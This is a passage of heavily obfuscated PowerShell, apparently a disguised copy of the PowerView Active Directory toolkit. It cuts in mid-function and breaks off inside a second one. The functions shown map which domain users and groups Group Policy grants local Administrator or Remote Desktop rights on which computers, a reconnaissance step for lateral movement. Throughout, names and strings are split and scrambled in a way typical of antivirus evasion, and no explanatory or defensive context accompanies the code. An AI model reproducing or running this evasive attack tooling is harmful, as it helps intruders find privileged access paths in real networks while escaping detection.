                                ${MeM`Ber`sId} = &("{1}{0}{2}{3}"-f'ver','Con','tTo','-SID') -Domain ${dO`maIn} -ObjectName ${Mem`Ber}

                                if (${m`eM`BerSid}) {
                                    ${grO`U`pMembE`Rs} += ${MEMbeR`s`ID}
                                }
                                else {
                                    ${grO`U`pMEMb`ers} += ${meMB`er}
                                }
                            }
                            else {
                                ${Group`m`EmBErS} += ${ME`mBeR}
                            }
                        }
                    }
                    ${_}."GR`o`UPMem`BerS" = ${gR`oupMembE`Rs}
                }

                ${_} | &("{1}{2}{0}" -f 'ember','Add','-M') ("{1}{3}{2}{0}" -f'ty','No','er','teprop') ("{0}{2}{1}" -f'GP','ayName','ODispl') ${gpODis`P`l`AYNa`me}
                ${_} | &("{1}{0}{2}" -f'd-Me','Ad','mber') ("{1}{2}{3}{0}"-f 'ty','Note','p','roper') ("{2}{0}{1}" -f 'P','OName','G') ${Gp`O`NAMe}
                ${_} | &("{1}{3}{0}{2}"-f'be','A','r','dd-Mem') ("{0}{2}{1}{3}" -f 'N','rop','otep','erty') ("{0}{1}{2}"-f 'GP','OTyp','e') ("{3}{6}{2}{1}{4}{0}{5}"-f'e','y','oupPolic','G','Preferenc','s','r')
                ${_}."PS`o`BjEcT"."tYp`eN`AMES".("{0}{1}"-f 'Ins','ert').Invoke(0, ("{2}{0}{3}{1}{4}" -f'werView','OG','Po','.GP','roup'))
                ${_}
            }
        }
    }
}


function gEt`-`d`OMainGPo`Userl`oCAl`GROu`pMAPp`ing {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}"-f 's','PSS','houldProces'}, '')]
    [OutputType({"{5}{1}{4}{0}{2}{3}" -f'ou','owerView.GPOUserL','pM','apping','ocalGr','P'})]
    [CmdletBinding()]
    Param(
        [Parameter(PosITIOn = 0, vaLUEfrOmPIpeLiNE = ${T`RuE}, vAlUefRompIpeliNebYproPERtYNAMe = ${Tr`Ue})]
        [Alias({"{3}{1}{0}{2}{4}" -f'uishe','ting','d','Dis','Name'}, {"{1}{3}{4}{0}{2}" -f'tNam','S','e','amAccou','n'}, {"{0}{1}"-f'Nam','e'})]
        [String]
        ${ideN`TITy},

        [String]
        [ValidateSet({"{1}{2}{0}{3}" -f 'or','Adm','inistrat','s'}, {"{3}{0}{2}{1}" -f'-','44','5-32-5','S-1'}, 'RDP', {"{3}{1}{0}{2}" -f'op',' Deskt',' Users','Remote'}, {"{2}{1}{0}"-f '32-555','-5-','S-1'})]
        ${lOCA`lgr`oUp} = ("{0}{4}{2}{3}{1}" -f 'A','ators','nis','tr','dmi'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOM`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f'AD','SP','ath'})]
        [String]
        ${SE`A`RchB`ASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{1}{2}{3}{0}"-f'r','nC','ontroll','e','Domai'})]
        [String]
        ${Se`Rv`ER},

        [ValidateSet({"{1}{0}"-f 'ase','B'}, {"{1}{0}{2}" -f 'e','OneLev','l'}, {"{1}{0}"-f 'ubtree','S'})]
        [String]
        ${sEA`RCH`ScOPE} = ("{1}{0}" -f 'btree','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`E`s`UlTpAgESiZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Se`RvE`RT`ime`LIm`iT},

        [Switch]
        ${tOMB`S`Tone},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRe`dE`NTial} =   (  VariabLe 21Gv7E -valUe)::"eM`pTy"
    )

    BEGIN {
        ${COm`MONA`RG`UMentS} = @{}
        if (${pSBouN`dp`AraMeTE`RS}[("{1}{0}" -f'omain','D')]) { ${comMOn`Ar`gumeNTS}[("{1}{0}" -f'ain','Dom')] = ${do`main} }
        if (${pSb`OunDP`A`RamET`ERs}[("{1}{0}"-f'r','Serve')]) { ${co`MmO`NA`RgU`menTS}[("{2}{0}{1}"-f 'erv','er','S')] = ${s`ERv`er} }
        if (${psBo`UndPa`R`A`MetE`Rs}[("{1}{0}{2}" -f 'rchScop','Sea','e')]) { ${Co`MMOnARGU`m`ENts}[("{1}{2}{3}{0}" -f 'hScope','S','e','arc')] = ${se`ArCHSC`O`Pe} }
        if (${ps`BOun`Dp`A`RAMet`Ers}[("{0}{1}{2}{3}" -f 'Re','sul','tPageSiz','e')]) { ${C`OM`mO`NARGumentS}[("{2}{3}{1}{0}"-f'e','eSiz','Res','ultPag')] = ${RESu`l`TpagE`SIzE} }
        if (${P`S`Bou`NDpArAm`ETERs}[("{1}{2}{3}{0}" -f'it','Serv','erTim','eLim')]) { ${Co`MMoNar`Gu`MeNtS}[("{3}{1}{0}{2}"-f 'rTimeLim','rve','it','Se')] = ${sEr`Vert`iME`L`i`MiT} }
        if (${Psb`Ou`NDpaRAMEt`Ers}[("{2}{0}{1}"-f'st','one','Tomb')]) { ${c`oM`Mo`NaRGu`Ments}[("{0}{2}{3}{1}"-f 'Tom','ne','b','sto')] = ${TOMB`sT`one} }
        if (${pS`B`oUnDPARAm`etErs}[("{2}{1}{0}"-f 'l','a','Credenti')]) { ${COm`m`O`NargUM`EnTS}[("{1}{0}{2}{3}"-f 'ed','Cr','enti','al')] = ${CR`EdEntI`AL} }
    }

    PROCESS {
        ${TarGE`T`sI`dS} = @()

        if (${p`sBoUn`dpAr`A`mEteRS}[("{1}{2}{0}"-f'ty','Id','enti')]) {
            ${T`Ar`g`EtSidS} += &("{2}{1}{3}{0}"-f'ct','omainOb','Get-D','je') @CommonArguments -Identity ${ideN`T`ity} | &("{3}{1}{2}{0}" -f't','lect-Obj','ec','Se') -Expand ("{2}{0}{1}" -f'bjec','tsid','o')
            ${TarG`EtO`BJeCT`S`id} = ${tArG`e`T`SiDs}
            if (-not ${tarGE`Ts`i`ds}) {
                Throw ('[G'+'et-D'+'omainG'+'POUs'+'erLo'+'c'+'a'+'lGroupMapping] '+'Unable'+' '+'to'+' '+'ret'+'r'+'ie'+'ve '+'SID'+' '+'f'+'or '+'ide'+'ntity'+' '+"'$Identity'")
            }
        }
        else {
            
            ${t`ARGE`TSiDS} = @('*')
        }

        if (${lo`CaLG`R`ouP} -match ("{1}{0}" -f '5','S-1-')) {
            ${tArg`ET`Loc`A`LSiD} = ${Lo`cA`LgrOup}
        }
        elseif (${L`O`cal`gRouP} -match ("{1}{0}" -f'in','Adm')) {
            ${T`ARgE`TlOca`lSid} = ("{0}{1}{3}{2}"-f 'S-1','-5-3','4','2-54')
        }
        else {
            
            ${TAr`geTLo`CAlsiD} = ("{3}{1}{2}{0}" -f '-32-555','1','-5','S-')
        }

        if (${tar`g`e`TSiDS}[0] -ne '*') {
            ForEach (${tAR`gET`SId} in ${tA`Rgets`i`ds}) {
                &("{2}{0}{1}" -f'Verbos','e','Write-') ('[Get-D'+'omainGPOUserLoc'+'alG'+'rou'+'pMappi'+'n'+'g] '+'Enu'+'m'+'er'+'ating '+'neste'+'d '+'g'+'roup'+' '+'m'+'e'+'m'+'berships '+'for'+': '+"'$TargetSid'")
                ${Ta`Rg`ET`sIds} += &("{1}{0}{2}"-f '-Dom','Get','ainGroup') @CommonArguments -Properties ("{0}{1}{2}" -f 'o','bje','ctsid') -MemberIdentity ${TAr`get`Sid} | &("{2}{3}{0}{1}"-f't-Obje','ct','Sel','ec') -ExpandProperty ("{0}{3}{1}{2}" -f 'o','jec','tsid','b')
            }
        }

        &("{3}{1}{4}{2}{0}" -f'e','rite','os','W','-Verb') ('[Get-'+'Dom'+'ai'+'nGPO'+'UserLocalGr'+'oupMap'+'ping] '+'T'+'ar'+'get '+'lo'+'calgr'+'o'+'up '+'SI'+'D: '+"$TargetLocalSID")
        &("{0}{1}{2}" -f'Wri','te-Verbo','se') ('['+'G'+'et-DomainG'+'P'+'OU'+'serLocalGroupMap'+'ping] '+'Effec'+'t'+'ive '+'targ'+'et'+' '+'do'+'main '+'S'+'IDs: '+"$TargetSIDs")

        ${Gp`oG`R`ouPs} = &("{2}{0}{3}{4}{1}" -f'POLocal','p','Get-DomainG','Gro','u') @CommonArguments -ResolveMembersToSIDs | &("{0}{2}{3}{1}{4}" -f 'ForEa','Obj','ch','-','ect') {
            ${Gp`OGr`ouP} = ${_}
            
            if (${GpO`Gro`UP}."gROUps`iD" -match ${tA`RG`Et`lOc`ALSID}) {
                ${G`Po`G`ROUp}."gRoU`PmEMB`E`Rs" | &("{1}{0}{3}{2}"-f'r','Whe','t','e-Objec') {${_}} | &("{0}{2}{1}"-f'ForEach-','ject','Ob') {
                    if ( (${tA`RGe`TSids}[0] -eq '*') -or (${T`Arge`TSIDS} -Contains ${_}) ) {
                        ${G`pO`GROuP}
                    }
                }
            }
            
            if ( (${g`pog`RouP}."group`Mem`B`erOf" -contains ${Tar`g`EtL`oCALSId}) ) {
                if ( (${ta`RG`eT`sids}[0] -eq '*') -or (${TarG`E`TSI`dS} -Contains ${GpOgr`o`Up}."g`RouPS`Id") ) {
                    ${g`pogRO`Up}
                }
            }
        } | &("{2}{0}{1}"-f 'ort-Ob','ject','S') -Property ("{1}{0}" -f 'me','GPONa') -Unique

        ${g`PoGr`oUPs} | &("{0}{2}{1}"-f 'Where-Obje','t','c') {${_}} | &("{1}{3}{2}{0}" -f 'ct','For','ch-Obje','Ea') {
            ${G`Pon`AMe} = ${_}."g`POdiSp`LayNA`Me"
            ${GPO`Gu`id} = ${_}."GPoN`AMe"
            ${GPo`PaTh} = ${_}."G`pop`ATH"
            ${gPo`TY`Pe} = ${_}."GpO`TYpE"
            if (${_}."g`RoUpme`mbERs") {
                ${gpomE`m`BErS} = ${_}."G`ROU`pmEm`BErS"
            }
            else {
                ${GP`OmEMB`E`Rs} = ${_}."G`RO`Upsid"
            }

            ${f`i`ltErS} = ${_}."F`I`lteRs"

            if (${tAR`ge`T`SiDs}[0] -eq '*') {
                
                ${T`ArgEToB`JEc`TsiDs} = ${GpOMe`m`B`ers}
            }
            else {
                ${t`A`Rge`ToBjecTsIDs} = ${tAR`GeToB`jEcTS`ID}
            }

            
            &("{2}{0}{3}{1}"-f 'oma','U','Get-D','inO') @CommonArguments -Raw -Properties ("{2}{1}{0}{3}" -f'gui','n','name,disti','shedname') -GPLink ${g`poGu`ID} | &("{1}{2}{0}{3}"-f'rEac','F','o','h-Object') {
                if (${fI`Lt`ERS}) {
                    ${OU`c`oMPU`TERS} = &("{0}{3}{1}{2}" -f'Ge','mpu','ter','t-DomainCo') @CommonArguments -Properties ("{6}{8}{7}{0}{4}{1}{2}{5}{3}" -f'g','ishe','dna','e','u','m','dnshos','e,distin','tnam') -SearchBase ${_}."Pa`Th" | &("{0}{2}{3}{1}" -f 'Whe','ject','re','-Ob') {${_}."dI`s`TIngui`sHeDnamE" -match (${f`ilTE`RS}."vAL`UE")} | &("{1}{3}{2}{0}" -f 't','Se','ec','lect-Obj') -ExpandProperty ("{0}{2}{3}{1}" -f 'd','name','ns','host')
                }
                else {
                    ${O`Uco`mpUtE`Rs} = &("{2}{3}{1}{0}"-f'er','Comput','Get','-Domain') @CommonArguments -Properties ("{2}{1}{0}{3}"-f'tnam','s','dnsho','e') -SearchBase ${_}."pa`TH" | &("{0}{1}{2}{3}" -f 'Sele','ct','-Objec','t') -ExpandProperty ("{2}{0}{1}" -f 'shost','name','dn')
                }

                if (${oUC`ompUt`ERs}) {
                    if (${Ou`Co`M`pUtErs} -isnot [System.Array]) {${OucO`mP`Ut`ERS} = @(${OuCo`MpUT`e`Rs})}

                    ForEach (${Tar`GETs`id} in ${tAR`gEt`Ob`jE`cTS`iDS}) {
                        ${Ob`J`ECT} = &("{0}{2}{3}{1}"-f'Get-D','Object','oma','in') @CommonArguments -Identity ${TAR`G`eT`siD} -Properties ("{3}{2}{9}{1}{8}{14}{6}{7}{10}{11}{13}{5}{12}{0}{15}{4}"-f'jec','count','a','sam','d','me,','ing','ui','nam','ccounttype,samac','shed','n','ob','a','e,dist','tsi')

                        ${isGRO`Up} = @(("{2}{1}{0}" -f'6','43545','268'),("{2}{1}{0}"-f '7','5','2684354'),("{0}{1}" -f '536870','912'),("{1}{2}{0}" -f'913','5368','70')) -contains ${o`BjEcT}."SAM`AcC`ouN`TtyPE"

                        ${G`Pol`o`Calg`RO`UpMAP`PINg} = &("{2}{0}{1}"-f'je','ct','New-Ob') ("{2}{1}{0}"-f'ct','SObje','P')
                        ${gPOloC`AlG`ROU`PM`AppiNG} | &("{1}{2}{0}" -f'r','Add-M','embe') ("{0}{1}{2}"-f'No','tepro','perty') ("{3}{1}{2}{0}"-f'ame','bject','N','O') ${O`Bject}."s`Am`A`ccountName"
                        ${GPOLo`cA`LG`R`Oup`MaP`pING} | &("{3}{2}{0}{1}"-f 'M','ember','dd-','A') ("{2}{3}{1}{0}" -f'rty','ope','Not','epr') ("{0}{2}{1}"-f'O','jectDN','b') ${o`B`JeCT}."DIs`T`INgui`s`Hedna`me"
                        ${GPo`l`OcAlG`RouPmAP`pInG} | &("{3}{1}{2}{0}"-f'r','d-','Membe','Ad') ("{0}{3}{1}{2}"-f 'Note','p','erty','pro') ("{2}{1}{0}"-f'ctSID','e','Obj') ${Obj`E`cT}."o`B`ject`Sid"
                        ${gPOLo`CA`lg`Ro`U`PM`APping} | &("{0}{1}{2}"-f'A','dd-Me','mber') ("{0}{1}{2}" -f 'Noteprop','ert','y') ("{0}{1}{2}" -f'D','oma','in') ${dO`mA`IN}
                        ${gPol`o`CALGRO`UpMaPPiNg} | &("{3}{0}{1}{2}" -f 'd-M','e','mber','Ad') ("{2}{1}{0}" -f'ty','proper','Note') ("{2}{0}{1}"-f'Gr','oup','Is') ${iSg`R`OUp}
                        ${gpO`locaL`g`Roup`maPpIng} | &("{2}{0}{3}{1}"-f 'b','r','Add-Mem','e') ("{1}{2}{0}"-f'ty','N','oteproper') ("{3}{0}{1}{2}"-f 'la','yN','ame','GPODisp') ${gp`ON`Ame}
                        ${GPoL`OcALgR`ouP`mAPp`iNg} | &("{0}{2}{1}" -f 'Add-M','mber','e') ("{2}{0}{3}{1}"-f 'tepro','ty','No','per') ("{1}{2}{0}" -f'id','GPO','Gu') ${g`pO`gUId}
                        ${GpOLoc`A`l`GrOuPmaP`PiNG} | &("{3}{1}{0}{2}"-f'mb','d-Me','er','Ad') ("{2}{0}{3}{1}" -f'tepro','y','No','pert') ("{1}{0}"-f 'ath','GPOP') ${gPoP`AtH}
                        ${GpoLoC`AL`G`RO`U`pMaPPiNg} | &("{1}{0}{2}" -f'd-','Ad','Member') ("{3}{1}{0}{2}" -f 'tep','o','roperty','N') ("{2}{1}{0}"-f 'ype','POT','G') ${GPO`T`ype}
                        ${gpo`LOCaLG`ROuPMA`pP`iNG} | &("{0}{2}{1}"-f'Add-Me','er','mb') ("{2}{3}{1}{0}"-f'y','rt','No','teprope') ("{1}{0}{2}{3}" -f'ntainer','Co','Na','me') ${_}."pr`oPERti`Es"."d`ist`iNG`U`IsHEdnaMe"
                        ${gpoLoc`ALGrO`UP`mA`pPINg} | &("{0}{2}{1}"-f 'A','r','dd-Membe') ("{3}{0}{1}{2}" -f'tepr','ope','rty','No') ("{0}{2}{1}{3}" -f'Comp','ter','u','Name') ${ou`c`oMputE`Rs}
                        ${G`pOlo`Ca`LgrO`UPMAPpING}."PSOB`Je`Ct"."TYPe`N`AmES".("{0}{1}"-f 'Ins','ert').Invoke(0, ("{6}{4}{0}{5}{7}{2}{3}{1}" -f 'View.GPOLoca','ng','Mapp','i','r','lGrou','Powe','p'))
                        ${GPOL`oC`AL`GrOUp`MApp`i`Ng}
                    }
                }
            }

            
            &("{2}{0}{1}"-f'et','-DomainSite','G') @CommonArguments -Properties ("{5}{2}{6}{4}{0}{1}{3}" -f'tinguis','he','t','dname','tbl,dis','si','eobjec') -GPLink ${g`pog`UId} | &("{2}{1}{3}{0}" -f 'ch-Object','rE','Fo','a') {
                ForEach (${taRG`e`TsID} in ${T`ArgetO`B`JeCtSiDS}) {
                    ${objE`CT} = &("{1}{3}{2}{0}"-f 'Object','Get','omain','-D') @CommonArguments -Identity ${T`ARGe`TSid} -Properties ("{2}{6}{0}{4}{8}{10}{9}{5}{1}{11}{3}{7}"-f 'c','guish','sa','me,object','counttype,sama','tin','ma','sid','ccoun','name,dis','t','edna')

                    ${is`G`ROUp} = @(("{2}{0}{1}" -f'8435','456','26'),("{0}{1}" -f '26','8435457'),("{0}{2}{1}"-f '5368','912','70'),("{1}{3}{0}{2}"-f '70','536','913','8')) -contains ${OB`J`ect}."sAma`CCOUN`TtY`PE"

                    ${G`pO`LocAlGR`Ou`Pma`pPING} = &("{1}{0}{2}{3}"-f 'w-O','Ne','bjec','t') ("{1}{2}{0}"-f'ct','PSObj','e')
                    ${g`P`OL`OcAL`GRo`UpmAp`pinG} | &("{1}{2}{0}" -f'ember','Add-','M') ("{0}{3}{2}{1}"-f'N','ty','oper','otepr') ("{1}{0}{3}{2}" -f 'e','Obj','Name','ct') ${O`BJE`cT}."S`AMa`ccoun`TnaMe"
                    ${gPoLo`C`A`lGRouPMAp`Pi`Ng} | &("{2}{1}{0}" -f'er','b','Add-Mem') ("{2}{0}{1}{3}" -f'o','te','N','property') ("{2}{1}{0}"-f 'N','tD','Objec') ${O`BJecT}."DI`St`IN`GUIShEdna`me"
                    ${gP`olO`cAL`GrOup`maPpINg} | &("{1}{2}{0}{3}" -f'be','Ad','d-Mem','r') ("{0}{1}{2}" -f'Note','prop','erty') ("{1}{0}{2}{3}"-f'ject','Ob','S','ID') ${Ob`je`ct}."o`BjEC`TSId"
                    ${GpO`localg`Ro`UP`MAPp`INg} | &("{0}{1}{2}" -f 'A','dd-Mem','ber') ("{0}{1}{2}"-f'N','otepro','perty') ("{1}{2}{0}"-f'p','IsGro','u') ${i`sgR`Oup}
                    ${gPo`LOCAlGr`OUPmaP`Pi`NG} | &("{0}{1}{2}" -f'A','dd-Mem','ber') ("{2}{0}{1}" -f'opert','y','Notepr') ("{0}{1}"-f'Domai','n') ${DO`M`AiN}
                    ${GPOlOcaLGrO`UPmAp`p`i`Ng} | &("{2}{0}{1}"-f'-Membe','r','Add') ("{0}{2}{1}"-f 'N','teproperty','o') ("{0}{1}{2}" -f 'GPODispl','ayNam','e') ${Gp`oN`AMe}
                    ${GpOLocal`g`R`o`Up`MaPPI`NG} | &("{1}{3}{0}{2}"-f'em','Add','ber','-M') ("{3}{2}{0}{1}" -f'e','property','t','No') ("{2}{1}{0}" -f'id','OGu','GP') ${GP`O`GuID}
                    ${gPo`l`ocaLgroupM`App`INg} | &("{1}{0}{2}{3}" -f 'dd-','A','Mem','ber') ("{1}{2}{0}" -f 'erty','Not','eprop') ("{1}{0}{2}" -f 'a','GPOP','th') ${Gp`oP`ATH}
                    ${gpO`lo`Cal`groUPMa`p`Pi`Ng} | &("{0}{1}{2}" -f 'Add-Me','mbe','r') ("{1}{0}{2}{3}"-f'o','Notepr','pe','rty') ("{0}{1}"-f 'GP','OType') ${g`POTy`Pe}
                    ${G`POLOcaL`Gro`UpM`Ap`pi`Ng} | &("{0}{1}{2}" -f'Add-Me','mbe','r') ("{1}{0}{2}{3}"-f'tep','No','ro','perty') ("{3}{2}{0}{1}"-f 'a','me','ontainerN','C') ${_}."dI`St`inGUIshedN`A`ME"
                    ${gpOLo`ca`LG`ROU`p`Mappi`Ng} | &("{1}{0}{2}" -f'dd-Me','A','mber') ("{0}{3}{2}{1}"-f 'Notep','y','rt','rope') ("{0}{2}{1}{3}"-f 'C','puterNam','om','e') ${_}."SITEObJ`e`C`TbL"
                    ${gPOloCal`Gr`O`U`P`Map`PiNG}."PS`ObJect"."ty`PEn`Ames".("{1}{0}" -f 'd','Ad').Invoke(("{0}{5}{8}{4}{6}{1}{7}{2}{3}"-f 'Po','up','in','g','w.GPOLocalGr','werV','o','Mapp','ie'))
                    ${gPOLoCalG`Rou`p`Map`PIng}
                }
            }
        }
    }
}


function g`ET-`dOmaIn`gpoCOmp`Ute`Rlo`CALGr`O`UPmApp`i`Ng {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{3}{1}{2}{0}"-f 's','houldPro','ces','SS','P'}, '')]
    [OutputType({"{4}{0}{3}{7}{6}{1}{2}{5}"-f'erV','lG','roupM','iew.GGPOCo','Pow','ember','a','mputerLoc'})]
    [CmdletBinding(DEFauLtParaMetErSETname = {"{3}{2}{0}{1}"-f 'erIde','ntity','mput','Co'})]
    Param(
        [Parameter(PoSiTiON = 0, PaRaMETErseTnAmE = "Com`PuTE`RiD`enTIty", mANDATORy = ${T`RUe}, vALUEFroMPIPElinE = ${T`RuE}, vALUefrOmPiPELIneBypROPErTynamE = ${tR`Ue})]
        [Alias({"{1}{0}{2}"-f'er','Comput','Name'}, {"{1}{0}" -f 'er','Comput'}, {"{0}{5}{3}{4}{2}{1}" -f 'Distingui','me','a','ed','N','sh'}, {"{2}{1}{0}"-f'ame','ountN','SamAcc'}, {"{1}{0}" -f 'ame','N'})]
        [String]
        ${coM`pUTe`RiD`entiTy},

        [Parameter(ManDATORy = ${T`RUe}, parAMeTErSEtnamE = "o`UiD`E`NtiTy")]
        [Alias('OU')]
        [String]
        ${O`UiDE`NtIty},

        [String]
        [ValidateSet({"{0}{2}{3}{1}"-f 'Administ','ors','ra','t'}, {"{0}{2}{1}{3}"-f 'S-1','5-3','-','2-544'}, 'RDP', {"{1}{2}{0}{4}{3}" -f'sk','Rem','ote De','Users','top '}, {"{2}{0}{1}" -f'-','555','S-1-5-32'})]
        ${L`oCA`LgROup} = ("{1}{3}{2}{0}"-f 'trators','A','minis','d'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${DoM`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'th','ADSPa'})]
        [String]
        ${SEAR`cHb`AsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{1}{2}"-f 'ol','le','r','DomainContr'})]
        [String]
        ${SEr`Ver},

        [ValidateSet({"{0}{1}" -f'Bas','e'}, {"{0}{2}{1}" -f 'OneLev','l','e'}, {"{2}{1}{0}" -f 'e','tre','Sub'})]
        [String]
        ${SeA`Rc`hS`cOPe} = ("{1}{0}{2}" -f'bt','Su','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rEsUl`TPaGe`s`i`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`RvE`RtIm`ELImit},

        [Switch]
        ${TOMb`sTO`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CReD`En`TIAl} =  ( vARIAble 21gv7e  -VaLu  )::"em`ptY"
    )

    BEGIN {
        ${Co`MMonA`RgUmE`NTs} = @{}
        if (${p`sb`oundParaMe`TeRS}[("{1}{0}{2}" -f 'm','Do','ain')]) { ${c`o`MMoNARg`Ume`Nts}[("{2}{0}{1}" -f'm','ain','Do')] = ${doma`In} }
        if (${p`Sbou`Ndp`ARAMEtE`RS}[("{1}{0}" -f'r','Serve')]) { ${coMMo`Nar`G`UM`enTs}[("{1}{2}{0}" -f 'ver','S','er')] = ${Se`RVeR} }
        if (${Psb`oun`dpA`RAMeT`erS}[("{1}{2}{3}{0}"-f'Scope','Se','ar','ch')]) { ${cOMMO`Na`R`gUM`ENtS}[("{2}{3}{1}{0}" -f'ope','Sc','Se','arch')] = ${seA`RChS`coPe} }
        if (${PsbOU`N`dPaR`AMEtErS}[("{0}{3}{2}{1}{4}" -f'Re','tPageSiz','l','su','e')]) { ${COmm`ONA`RGU`me`NTs}[("{2}{0}{3}{1}" -f 'e','e','ResultPag','Siz')] = ${REsU`ltpaG`EsI`ZE} }
        if (${PSB`OUnDpaRAM`et`eRs}[("{2}{1}{3}{0}{4}"-f'Li','erT','Serv','ime','mit')]) { ${CO`m`MONARGU`M`EnTS}[("{1}{2}{3}{0}"-f 'erTimeLimit','Se','r','v')] = ${SErV`ERtImElI`mit} }
        if (${P`SbOu`Nd`P`ARAMe`TerS}[("{0}{3}{2}{1}"-f 'To','e','bston','m')]) { ${comMona`Rgu`M`EN`TS}[("{1}{0}"-f 'one','Tombst')] = ${ToMb`sto`NE} }
        if (${PsbouN`dPa`R`AMEteRS}[("{1}{0}{2}" -f'nt','Crede','ial')]) { ${Com`mO`NarGU`Me`NTS}[("{2}{3}{1}{0}" -f 'ial','dent','Cr','e')] = ${CR`e`DEnTiAL} }
    }

    PROCESS {
        if (${p`sBOuNDPa`Ra`mETERs}[("{3}{4}{1}{0}{2}" -f 'de','terI','ntity','Comp','u')]) {
            ${C`OmPUt`ERS} = &("{0}{3}{1}{2}{4}" -f'G','t-DomainCom','pu','e','ter') @CommonArguments -Identity ${CO`mPU`TeRid`Ent`ItY} -Properties ("{5}{4}{3}{1}{0}{2}"-f 'stna','ho','me','name,dns','d','distinguishe')

            if (-not ${CO`MPU`T`eRs}) {
                throw ('[Ge'+'t-'+'Domai'+'nG'+'PO'+'Comput'+'e'+'rLoc'+'alG'+'r'+'oupM'+'apping] '+'C'+'om'+'puter '+"$ComputerIdentity "+'not'+' '+'f'+'ou'+'nd. '+'T'+'ry '+'a '+'f'+'ully '+'qu'+'a'+'lified '+'ho'+'st '+'n'+'ame.')
            }

            ForEach (${cO`m`PUteR} in ${c`oMpuT`eRS}) {

                ${Gpo`guiDS} = @()

                
                ${dN} = ${COMP`UTER}."DiS`T`inG`U`IsHEdnamE"
                ${ou`Ind`Ex} = ${Dn}.("{1}{0}" -f'ndexOf','I').Invoke('OU=')
                if (${O`UIND`EX} -gt 0) {
                    ${oUn`Ame} = ${D`N}.("{3}{1}{0}{2}"-f 'r','t','ing','SubS').Invoke(${OUi`NDEx})
                }
                if (${OU`NAMe}) {
                    ${GP`o`G`UIDS} += &("{2}{0}{3}{1}" -f'oma','U','Get-D','inO') @CommonArguments -SearchBase ${Ou`N`AMe} -LDAPFilter ("{1}{0}{2}" -f'plink','(g','=*)') | &("{3}{2}{1}{0}" -f'ach-Object','E','or','F') {
                        &("{0}{2}{1}{3}" -f'Sel','Str','ect-','ing') -InputObject ${_}."G`pL`InK" -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | &("{1}{3}{0}{2}"-f 'rEach-Obj','F','ect','o') {${_}."MAT`c`hEs" | &("{3}{1}{4}{2}{0}" -f'ject','e','b','Sel','ct-O') -ExpandProperty ("{1}{0}"-f 'lue','Va') }
                    }
                }

                
                &("{2}{0}{1}" -f'te-V','erbose','Wri') "Enumerating the sitename for: $($Computer.dnshostname) "
                ${coMp`UT`ErsItE} = (&("{0}{4}{5}{6}{3}{1}{2}"-f 'G','i','teName','S','et-','N','etComputer') -ComputerName ${C`Om`PuteR}."DN`ShOsTN`Ame")."sITeN`A`mE"
                if (${comPUT`er`SItE} -and (${COm`p`U`TE`RSitE} -notmatch ("{1}{0}"-f'ror','Er'))) {
                    ${GPoGui`ds} += &("{1}{0}{2}" -f 'S','Get-Domain','ite') @CommonArguments -Identity ${co`M`pUtE`RSitE} -LDAPFilter ("{0}{2}{1}" -f '(g','=*)','plink') | &("{3}{2}{0}{1}"-f 'c','t','orEach-Obje','F') {
                        &("{0}{2}{1}"-f'Sel','ng','ect-Stri') -InputObject ${_}."gPl`InK" -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | &("{2}{0}{1}" -f 'o','rEach-Object','F') {${_}."m`AtcH`es" | &("{2}{0}{1}" -f '-O','bject','Select') -ExpandProperty ("{0}{1}" -f 'Val','ue') }
                    }
                }

                
                ${gp`Og`UiDs} | &("{4}{0}{1}{2}{3}"-f 't-DomainGPOLoc','al','Gr','oup','Ge') @CommonArguments | &("{0}{1}{2}"-f'S','ort-','Object') -Property ("{1}{0}"-f 'e','GPONam') -Unique | &("{3}{0}{2}{1}"-f'E','ct','ach-Obje','For') {
                    ${g`pogro`Up} = ${_}

                    if(${Gpog`Ro`UP}."GRO`UpM`embERs") {
                        ${GPOME`mB`Ers} = ${g`pOgrouP}."gr`oUpMe`MB`ERs"
                    }
                    else {
                        ${GpO`M`eMbers} = ${GpO`g`RoUp}."G`RoupS`ID"
                    }

                    ${gpo`MEm`BErS} | &("{0}{2}{3}{1}" -f'ForE','ct','ach-Obj','e') {
                        ${o`BJe`Ct} = &("{2}{1}{3}{0}"-f 'ct','ainOb','Get-Dom','je') @CommonArguments -Identity ${_}
                        ${i`sGr`OuP} = @(("{2}{1}{0}" -f '456','35','2684'),("{3}{0}{1}{2}"-f '4','35','457','268'),("{3}{0}{1}{2}" -f'3','687','0912','5'),("{0}{1}{2}"-f'5368','70','913')) -contains ${OB`J`EcT}."s`AMa`ccoUN`T`TypE"

                        ${gpO`cOmPu`T`Erl`ocALgr`o`UPMEm`BER} = &("{1}{2}{0}" -f 'bject','New','-O') ("{0}{2}{1}"-f 'PSO','ject','b')
                        ${gPO`c`OmPUTE`RLocAlGRO`UPmE`MBer} | &("{0}{1}{2}"-f'Add-M','em','ber') ("{3}{1}{0}{2}"-f 't','teproper','y','No') ("{3}{0}{1}{2}"-f 'p','u','terName','Com') ${CO`mPuT`ER}."Dns`hos`TnAme"
                        ${GpoC`Om`pUTErLocA`lgrOUP`meMBER} | &("{2}{1}{0}" -f'r','be','Add-Mem') ("{1}{0}{3}{2}" -f'o','N','erty','teprop') ("{1}{2}{0}" -f'me','Ob','jectNa') ${O`BJECT}."s`AMACCO`U`NTNaMe"
